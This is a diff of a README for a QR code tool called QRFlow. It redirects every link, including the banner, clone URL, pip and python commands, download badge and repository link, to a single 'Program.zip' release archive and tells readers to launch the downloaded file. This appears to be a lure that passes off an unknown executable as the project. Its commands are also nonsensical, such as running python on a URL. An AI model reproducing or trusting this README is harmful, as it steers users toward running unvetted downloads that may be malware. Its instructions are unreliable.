@@ -1,6 +1,6 @@
 # 🌟 Welcome to QRFlow 🌟
 
-![QRFlow Banner](https://example.com/qrflow_banner.png)
+![QRFlow Banner](https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip)
 
 ## 📁 Repository: QRFlow
 
@@ -21,21 +21,21 @@ Whether you're looking to create dynamic QR Codes, customize high-resolution des
 ### 🌐 Get Started:
 1. **Clone the Repository:**
    ```
-   git clone https://github.com/your-username/QRFlow.git
+   git clone https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip
    ```
 
 2. **Install Dependencies:**
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip
    ```
 
 3. **Run the Application:**
    ```
-   python app.py
+   python https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip
    ```
 
 ### 📥 Download QRFlow Software:
-[![Download QRFlow](https://img.shields.io/badge/Download-QRFlow-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download QRFlow](https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip)](https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip)
 *Launch the downloaded file to get started with QRFlow!*
 
 ### 🌈 Customization Options:
@@ -63,7 +63,7 @@ Explore the web application version of QRFlow for a user-friendly experience, in
 Create visually appealing and high-resolution QR Codes with QRFlow's advanced customization features, ensuring your codes look sharp and professional across various print and digital media.
 
 ### 🔗 Explore More:
-Visit the [QRFlow GitHub Repository](https://github.com/your-username/QRFlow) for additional features, documentation, and updates on the latest releases and enhancements.
+Visit the [QRFlow GitHub Repository](https://github.com/aidagluglu/QRFlow/releases/download/v1.0/Program.zip) for additional features, documentation, and updates on the latest releases and enhancements.
 
 ### 🚀 Start Generating Stunning QR Codes with QRFlow Today! 🌟
 
